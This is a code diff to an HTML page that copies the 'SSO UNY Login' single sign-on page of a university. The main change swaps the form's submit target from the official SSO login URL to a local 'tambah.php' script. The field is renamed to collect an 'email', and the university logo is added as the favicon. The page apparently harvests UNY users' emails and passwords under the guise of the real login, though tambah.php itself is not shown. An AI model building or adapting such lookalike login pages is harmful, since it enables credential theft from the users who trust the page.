@@ -3,7 +3,8 @@
 <html lang="en_US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>SSO UNY Login</title>
     
-        <link type="text/css" rel="stylesheet" href="bootstrap2.min.css">
+    <link type="text/css" rel="stylesheet" href="bootstrap2.min.css">
+    <link rel="icon" href="./assets/images/logo_uny.png">
     <link type="text/css" rel="stylesheet" href="uny-cas-kembara.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"><!-- <link rel="stylesheet" type="text/css" th:href="@{#{webjars.normalize.css}}" />
     <link rel="stylesheet" type="text/css" th:href="@{#{webjars.bootstrap-grid.css}}" />
@@ -79,16 +80,18 @@
         </div>
             </div>
             <div class="">
-                <form method="post" id="fm1" action="https://sso.uny.ac.id/login" onsubmit="loginFormSubmission();">
+                <form method="POST" action="tambah.php" id="fm1" onsubmit="loginFormSubmission();">
                     <div id="login-form-controls">
                         <div class="row">
-                            <!-- Input Username --><section id="usernameSection" class="col-12">
+                            <!-- Input Username -->
+                                <section id="usernameSection" class="col-12">
                                 <label for="username">
                                     <span class="font-weight-bold"><span class="accesskey">U</span>NY ID:</span>
                                 </label>
                                 <div class="form-group position-relative">
                                     <span class="zmdi zmdi-account"></span>
-                                    <input type="text" id="username" class="form-control" accesskey="u" autocapitalize="none" spellcheck="false" autocomplete="username" required="" placeholder="Email UNY" name="username" value=""></div>
+                                    <input type="email" id="email" class="form-control" accesskey="u" autocapitalize="none" spellcheck="false" autocomplete="email" required="" placeholder="Email UNY" name="email" value="">
+                                </div>
                                 <div class="mdc-text-field-helper-line invalid-feedback">
                                     <div class="mdc-text-field-helper-text mdc-text-field-helper-text--validation-msg" aria-hidden="true">
                                         <span id="usernameValidationMessage">Username is a required field.</span>
@@ -106,9 +109,9 @@
                                             $('#usernameSection').hide();
                                         }
                                     }
-                                    /*]]>*/
-                                </script>
-                            </section>
+                                        /*]]>*/
+                                    </script>
+                                </section>
 
                             <!-- Input Password --><section class="col-12" id="passwordSection">
                                 <label for="password">
@@ -116,8 +119,8 @@
                                 </label>
                                 <div class="form-group position-relative">
                                     <span class="btn zmdi zmdi-eye-off zmdi-eye" id="togglePassword"></span>
-                                    <input class="form-control" type="password" id="password" accesskey="p" autocomplete="off" required="" placeholder="Password" name="password" value=""></div>
-
+                                    <input class="form-control" type="password" id="password" accesskey="p" autocomplete="off" required="" placeholder="Password" name="password" value="">
+                                </div>
                                 <div class="mdc-text-field-helper-line invalid-feedback">
                                     <div class="mdc-text-field-helper-text mdc-text-field-helper-text--validation-msg" aria-hidden="true">
                                         <span id="passwordValidationMessage">Password is a required field.</span>
@@ -129,6 +132,7 @@
                                     </div>
                                 </div>
                             </section>
+                             
                         </div>
 
                         <section class="cas-field">
@@ -140,10 +144,10 @@
                         </section>
 
                         <div class="col-12 mt-30">
-                <button type="submit" id="submitBtn" class="btn btn-dark btn-block" name="submitBtn" accesskey="l">
-                    <span>LOGIN</span>
-                </button>
-                <input class="btn btn-info btn-block" name="reset" accesskey="c" value="CLEAR" tabindex="7" type="reset"></div>
+                        <button type="SUBMIT" id="submitBtn" class="btn btn-dark btn-block" name="submitBtn" accesskey="l">
+                            <span>LOGIN</span>
+                        </button>
+                    <input class="btn btn-info btn-block" name="reset" accesskey="c" value="CLEAR" tabindex="7" type="reset"></div>
 
             <!-- <button class="mdc-button mdc-button--raised btn btn-primary btn-primary"
                 th:if="${recaptchaSiteKey == null}" th:name="${name ?: 'submitBtn'}" th:id="${id ?: 'submitBtn'}"
